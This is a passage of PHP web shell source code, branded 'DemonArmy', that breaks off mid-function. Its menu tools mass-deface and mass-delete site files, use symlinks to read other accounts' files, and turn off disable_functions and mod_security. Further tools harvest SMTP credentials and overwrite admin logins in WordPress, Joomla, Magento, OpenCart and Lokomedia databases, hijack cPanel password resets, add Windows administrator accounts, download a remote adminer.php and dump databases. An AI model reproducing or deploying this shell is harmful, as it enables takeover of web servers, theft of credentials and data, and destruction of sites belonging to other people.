	} else {
	echo "<center>";
	echo "<form class='oxp_table' method='post'>
  <font>Select type :</font><br>
  <input  type='radio' name='type' value='normal' checked>One dir<input type='radio' name='type' value='abnormal'>All dir<br>
  <font>Folder :</font><br>
  <input class='oxp_table' type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
  <font>Filename :</font><br>
  <input class='oxp_table' type='text' name='d_file' value='sx.php' style='width: 450px;' height='10'><br>
  <font>Index File :</font><br>
  <textarea class='oxp_table' name='script' style='width: 450px; height: 200px;'>Touch by DemonArmy</textarea><br>
  <input class='oxp_table' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
  </form></center><br>";
	}
} elseif($_GET['olle'] == 'mass_delete') {function mass_delete($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#434343>OK</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = mass_delete($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
mass_delete($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form class='oxp_table' method='post'>
   <font>Folder :</font><br>
   <input class='oxp_table' type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input class='oxp_table' type='text' name='d_file' placeholder='sx.php' style='width: 450px;' height='10'><br>
   <input class='oxp_table' type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form></center><br>";
   }
} elseif($_GET['olle'] == 'vhost') {echo "<form method='POST' action=''>";
	echo "<center><br><font size='4'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='bypassxd' class='oke'></center>";
		if (isset($_POST['bypassxd'])){
                        mkdir('oxp_vhost', 0755);
                        chdir('oxp_Xploit_vhost');
                        system('ln -s / oxp_Xploit');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+-"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","evil_twin_vhost");
			$rt="<br><a href=oxp_xploit_vhost/oxp_xploit TARGET='_blank'><font size=3>Click Here!</font></a>";
			echo "<font size=2 color=#B0B0B0>$rt<br>Note : If Forbidden when opening /var/www/vhosts/domain.com<br> please add httpdocs!<br>example : /var/www/vhosts/domain.com/httpdocs</font></center>";} echo "</form>";
} elseif($_GET['olle'] == 'sym404') {echo '<center><form class="oxp_table" enctype="multipart/form-data" method="post"><h2> Sym404 </h2><br>
<font>Target : </font><input class="oxp_table" type="text" name="dir" placeholder="/home/user/public_html/namaconfig.php"><br>
<font>Save As : </font><input class="oxp_table" type="text" name="save"><br><input name="bypass" type="submit" value="Bypass !!!"></form>';
if($_POST['bypass']) {
mkdir("olle404_sym", 0777);
$dir = $_POST['dir'];
$save = $_POST['save'];
shell_exec("ln -s".$dir." olle404_sym/".$save);
symlink($dir,"olle404_sym/".$save);
$fopsym = fopen("olle404_sym/.htaccess","w");
fwrite($fopsym,"ReadmeName ".$save);
fclose($fopsym);
echo '<a href="olle404_sym/">Touch !!!</a><br></center>';}
} elseif($_GET['olle'] == 'smtp') {
	echo "<center><br><font size=3>This tool will succeed if run in the config folder.<br>example : [<i>/home/user/public_html/sx_conf </i>]</font></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=#B0B0B0>$smtp_host</font><br>";
				echo "SMTP port: <font color=#B0B0B0>$smtp_port</font><br>";
				echo "SMTP user: <font color=#B0B0B0>$smtp_user</font><br>";
				echo "SMTP pass: <font color=#B0B0B0>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=#B0B0B0>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=#B0B0B0>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['olle'] == 'bypdisf') {echo "<center><br>";
		echo "<form method=post><input type=submit name=ini value='php.ini' /><input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>Click Here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo ".htaccess Successfully Created!";
}
		echo"</center><br>";

} elseif($_GET['olle'] == 'autoeu') {if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "Username or password must be more than 6 characters.";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config -> ".$file_conf."<br>";
					echo "CMS -> Joomla<br>";
					if($site == '') {
						echo "Sitename -> <font color=#B0B0B0>error, cant take the domain name</font><br>";
					} else {
						echo "Sitename -> $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status -> <font color=#B0B0B0>".mysql_error()."</font><br><br>";
					} else {
						echo "Status -> <font color=#FFFFFF>Successful editing user, please login with new username and password.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login -> <font color=#B0B0B0>error, cant take the domain namea</font><br>";
					} else {
						$url_target = "Login -> <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config -> ".$file_conf."<br>";
					echo "CMS -> Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status -> <font color=#B0B0B0>".mysql_error()."</font><br><br>";
					} else {
						echo "Status -> <font color=#FFFFFF>Successful editing user, please login with new username and password.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login -> <font color=#B0B0B0>error, cant take the domain namea</font><br>";
					} else {
						$url_target = "Login -> <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config -> ".$file_conf."<br>";
					echo "CMS -> Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status -> <font color=#B0B0B0>".mysql_error()."</font><br><br>";
					} else {
						echo "Status -> <font color=#FFFFFF>Successful editing user, please login with new username and password.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login -> <font color=#B0B0B0>error, cant take the domain namea</font><br>";
					} else {
						$url_target = "Login -> <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config -> ".$file_conf."<br>";
					echo "CMS -> OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status -> <font color=#B0B0B0>".mysql_error()."</font><br><br>";
					} else {
						echo "Status -> <font color=#FFFFFF>Successful editing user, please login with new username and password.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login -> <font color=#B0B0B0>error, cant take the domain namea</font><br>";
						if($target2 == '') {
							$url_target2 = "Login -> <font color=#B0B0B0>error, cant take the domain namea</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login -> <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login -> <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login -> <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=#B0B0B0>I dont know where the admin login :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login -> <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login -> <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login -> <a href='$target' target='_blank'><u>$target</u></a> [ <font color=#B0B0B0>I dont know where the admin login :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config -> ".$file_conf."<br>";
					echo "CMS -> Lokomedia<br>";
					if(preg_match('/Error, cant take the domain name/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status -> <font color=#B0B0B0>".mysql_error()."</font><br><br>";
					} else {
						echo "Status -> <font color=#FFFFFF>Successful editing user, please login with new username and password.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>Auto Edit User</h1>
    <form class='oxp_table'  method='post'>
    <input type='radio' class='oxp_table' name='config_type' value='dir' checked>DIR Config<input type='radio' class='oxp_table' name='config_type' value='link'>LINK Config<br>
    <input class='oxp_table' type='text' size='50' name='config_dir' value='$path'><br><br>
    Username : <input type='text' class='oxp_table' name='user_baru' value='DemonArmy'><br>
    Password : <input type='text' class='oxp_table' name='pass_baru' value='DemonArmy'><br>
    <input type='submit' name='hajar' value='Go!' style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;'>
    </form><br>";}
} elseif($_GET['olle'] == 'domains') {echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';

} elseif($_GET['olle'] == 'cpanel') {
	echo '<center><div style="border-radius: 6px;padding: 4px 2px;width: 24%;line-height: 24px;background: #1E1E1E;color:white;"><br><p>
<form action="#" method="post"><b> Email : </b><input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:#1E1E1E;" /><input type="submit" name="submit" value="Send!" style="style="border-radius: 6px;font: 9px; color:#1E1E1E;"/></form><br></p></div></center>';
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');
if(isset($_POST['submit'])){
$email = $_POST['email'];
$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
echo '<br/><center>user:'.$user.'</center>'; }
 } elseif($_GET['olle'] == 'endec'){
@ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
 $text = $_POST['code'];
 ?>
 <center>
 <h2>Encode And Decode</h2>
 <form method="post">
 <br>
 <textarea class='form-control con7' cols='60' rows='10' name="code"></textarea>
 <br><br>
 <select class='form-control con7' size="1" name="ope">
 <center>
 <option value="urlencode">url</option>
 <option value="base64">base64</option>
 <option value="ur">convert_uu</option>
 <option value="json">json</option>
 <option value="gzinflates">gzinflate - base64</option>
 <option value="str2">str_rot13 - base64</option>
 <option value="gzinflate">str_rot13 - gzinflate - base64</option>
 <option value="gzinflater">gzinflate - str_rot13 - base64</option>
 <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
 <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
 <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
 <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
 </center>
 </select>
 &nbsp;<br><br><input type='submit' name='submit' value='Encode'>
 <input type='submit' name='submits' value='Decode'>
 </form>
 <br>
 <?php 
 $submit = $_POST['submit'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_encode($text);
 break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
 break;case 'json' : $codi=json_encode(utf8_encode($text));
 break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
 break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
 break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
 break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
 break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
 break;case 'str2' : $codi=base64_encode(str_rot13($text));
 break;case 'urlencode' : $codi=rawurlencode($text);
 break;case 'ur' : $codi=convert_uuencode($text);
 break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
 break;default:break;}}
 
 $submit = $_POST['submits'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_decode($text);
 break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
 break;case 'json' : $codi=utf8_decode(json_decode($text));
 break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
 break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
 break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
 break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
 break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
 break;case 'str2' : $codi=str_rot13(base64_decode($text));
 break;case 'urlencode' : $codi=rawurldecode($text);
 break;case 'ur' : $codi=convert_uudecode($text);
 break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
 break;default:break;}}
 $html = htmlentities(stripslashes($codi));
 echo "<form><textarea cols=60 rows=10 class='form-control con7' >".$html."</textarea></center></form><br/><br/>";
 } elseif($_GET['do'] == 'hashgen') {
 $submit = $_POST['enter'];
 if (isset($submit)) {
 $pass = $_POST['password']; // password
 $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 $hash = md5($pass); // md5 hash #1
 $md4 = hash("md4", $pass);
 $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
 $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
 $hash1 = sha1($pass); // sha1 hash #4
 $sha256 = hash("sha256", $text);
 $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 }
 echo '<form action="" method="post">';
 echo '<center><h2>Hash Generator</h2>';
 echo '<table>';
 echo 'Masukkan teks yang ingin di encrypt: ';
 echo '<input type="text" name="password" size="40">';
 echo '<input type="submit" name="enter" value="Hash!">';
 echo '<br>';
 echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
 echo 'MD5: <input type=text size=50 value='.$hash.'><br><br>';
 echo 'MD4: <input type=text size=50 value='.$md4 .'><br><br>';
 echo 'MD5 with Salt: <input type=text size=50 value='.$hash_md5.'><br><br>';
 echo 'MD5 with Salt & Sha1: <input type=text size=50 value='.$hash_md5_double.'><br><br>';
 echo 'Sha1: <input type=text size=50 value='.$hash1 .'><br><br>';
 echo 'Sha256: <input type=text size=50 value='.$sha256.'><br><br>';
 echo 'Sha1 with Salt: <input type=text size=50 value='.$hash1_sha1.'><br><br>';
 echo 'Sha1 with Salt & MD5: <input type=text size=50 value='.$hash1_sha1_double.'></center></table>';
} elseif($_GET['olle'] == 'rdp'){
	if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { ?><center><br/><br/>
						<div id="content-left">
								<form class="oxp_table" action="" method="post">
								<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
									<tr><font size="2px" color="white">CREATE RDP</font></td>
									</tr>
									<tr>
										<td><font>Username</font></td>
										<td><font> : </font></td>
										<td><input type="text"  name="username" required></td>
									</tr>
									<tr>
										<td><font>Password</font></td>
										<td><font> : </font></td>
										<td><input type="text"  name="password" required></td>
									</tr>
									<tr>
										<td colspan="3" align="center"><input type="hidden" name="kshell" value="1"><input type="submit" name="submit"  value="Create"></td>
									</tr>
								</table>
								</form>
								</div>
								<br/>
								<div id="content-left">
								<form class="oxp_table" action="" method="post">
									<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
										<tr>
											<td colspan="3" align="center" bgcolor="#2d2b2b"><font size="2px" color="white">OPTION</td>
										</tr>
										<tr>
											<td><font>Username</font></td>
											<td><font> : </font></td>
											<td><input type="text" name="rusername" placeholder="Username" ></td>
										</tr>
										<tr>
											<td><font>Password</font></td>
											<td><font> : </font></td>
											<td><input type="text" name="gantipw" placeholder="Password"></td>
										</tr>
										<tr>
											<td><font>Action</font></td>
											<td><font> : </font></td>
											<td>
												<select name="aksi" >
														<option value="1">Show Username</option>
														<option value="2">Delete Username</option>
														<option value="3">Change Password</option>
												</select>
											</td>
										</tr>
										<tr><input type="hidden" name="kshell" value="2"><input type="submit" name="submit"  value="Execute"></td>
										</tr>
									</table>
								</form>
								<br/>
						</div>
						</center></center>
					<?php  if($_POST['submit']) { if($_POST['kshell']=="1") { $r_user = $_POST['username']; $r_pass = $_POST['password']; $cmd_cek_user = shell_exec("net user"); if(preg_match("/$r_user/", $cmd_cek_user)){ echo $gaya_root.$r_user." already available".$o; }else { $cmd_add_user = shell_exec("net user ".$r_user." ".$r_pass." /add"); $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add"); $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add"); $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add"); if($cmd_add_user){ echo $gaya_root."<font size=2>[x] Add User : ".$r_user." Password : ".$r_pass." <font color=#B0B0B0>Success!</font></font><br/><br/>".$o; }else { echo $gaya_root."<font size=2>[x] Add User : ".$r_user." Password : ".$r_pass." <font color=#B0B0B0>Failed!</font><br/><br/>".$o; } echo "<font size=2>[x] Processing Users, Please Wait a minute..<br/>"; if($cmd_add_groups1){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font size=2>Successfully Processed!</font><br/><br/>".$o; }else if($cmd_add_groups2){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font size=2 color=#B0B0B0>Successfully Processed!</font><br/><br/>".$o; }else if($cmd_add_groups3){ echo $gaya_root."<font size=2>[x] Congratulations! User ".$r_user." <font color=#B0B0B0>Successfully Processed!</font><br/><br/>".$o; }else { echo $gaya_root."<font size=2>[x] Sorry User ".$r_user." <font color=#B0B0B0>Failure to Process!</font><br/><br/>".$o; } echo "<font size=2>[x] Server Info : </font><br/>"; echo $gaya_root."<font size=2>[x] ServerIP : ".$_SERVER["HTTP_HOST"]."</font><br/><font size=2>[x] Username  : ".$r_user."</font><br/><font size=2>[x] Password  : </font>".$r_pass.$o."</font><br/><br/>"; echo "<font size=2>[x] Thank for using it [x]</font><br/><br/>"; } } else if($_POST['kshell']=="2") { echo "<style>
									</style>"; if($_POST['aksi']=="1"){ echo "<pre>".shell_exec("net user"); } else if($_POST['aksi']=="2") { $username = $_POST['rusername']; $cmd_cek_user = shell_exec("net user"); if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username." /DELETE"); if($cmd_add_user){ echo "<font size=2>[x] Processing, Please Wait..</font><br /><br />"; echo $gaya_root."<font size=2>[x] Congratulations! Remove User  </font><font size=2>".$username." </font><font color=#B0B0B0>Success !!</font><br /><br />".$o; }else { echo $gaya_root."<font size=2>[x] Yeah :( Remove User  </font><font size=2>".$username." </font><font color=#B0B0B0>Failed!!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2>Are You Kidding Me?! Username : </font><font size=2>" .$username. " </font><font color=#B0B0B0> It Does Not Exist !! </font><br /><br />".$o; } }else { echo $gaya_root."<font size=2> Please Enter the First Username to delete !! </font><br /><br />".$o; } } else if($_POST['aksi']=="3") { echo "<style> 
									  </style>"; $username = $_POST['rusername']; $password = $_POST['gantipw']; $cmd_cek_user = shell_exec("net user"); if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username.""); if($cmd_add_user){ echo $gaya_root."<font size=2>Change the Username Password : ".$username." and Password : ".$password." <font color=#B0B0B0>Success !!</font><br /><br />".$o; }else { echo $gaya_root."<font size=2>Change Username Password: ".$username." dan Password : ".$password." <font color=#B0B0B0>Failed!!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2>Are You Kidding Me?! Username : </font><font'>" .$username. " </font><font size=2 color=#B0B0B0> It Doesn't Exist !!</font><br /><br />".$o; } }else { echo $gaya_root."<font size=2> Please Enter the First Username to delete !! </font><br><br</center>".$o; } } } } } else{ echo "<br><br><center><font color='#B0B0B0'>TOOLS CANNOT BE USED, THE SERVICE IS NOT WINDOWS!</font></center>"; } 
} elseif($_GET['olle'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
	} else {
		if(adminer("https://raw.githubusercontent.com/eviltwin-dev/adm/master/adminer.php","adminer.php")) {
			echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
		} else {
			echo "<center><font>Failed to create file adminer.</font></center>";
		}
	}
} elseif($_GET['olle'] == 'dbdump') {
	echo '<hr><pre><center>';
echo '<form class="oxp_table" action=?dbdump method=post>
Database Dump
Server        : <input type=text name=server size=52>
Username      : <input type=text name=username size=52>
Password      : <input type=text name=password size=52>
DataBase Name : <input type=text name=dbname size=52>
DB Type       : <form method=post action="?dbdump"><select name=method><option  value="gzip">Gzip</option><option value="sql">Sql</option></select>
<input class="inputzbut" type=submit value="  Dump!  " >
</form></center></pre><script>';
  if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
  $date = date("Y-m-d");
  $dbserver = $_POST['server'];
  $dbuser = $_POST['username'];
  $dbpass = $_POST['password'];
  $dbname = $_POST['dbname'];
  $file = "Dump-$dbname-$date";
  $method = $_POST['method'];
  if ($method=='sql'){
  $file="Dump-$dbname-$date.sql";
  $fp=fopen($file,"w");
  }else{
  $file="Dump-$dbname-$date.sql.gz";
  $fp = gzopen($file,"w");
  }
  function write($data) {
  global $fp;
  if ($_POST['method']=='ssql'){
  fwrite($fp,$data);
  }else{
  gzwrite($fp, $data);
  }}
  mysql_connect ($dbserver, $dbuser, $dbpass);
  mysql_select_db($dbname);
  $tables = mysql_query ("SHOW TABLES");
  while ($i = mysql_fetch_array($tables)) {
      $i = $i['Tables_in_'.$dbname];
      $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
      write($create['Create Table'].";nn");
      $sql = mysql_query ("SELECT * FROM ".$i);
      if (mysql_num_rows($sql)) {
          while ($row = mysql_fetch_row($sql)) {
              foreach ($row as $j => $k) {
                  $row[$j] = "'".mysql_escape_string($k)."'";
              }
              write("INSERT INTO $i VALUES(".implode(",", $row).");n");
          }
      }
  }
  if ($method=='ssql'){
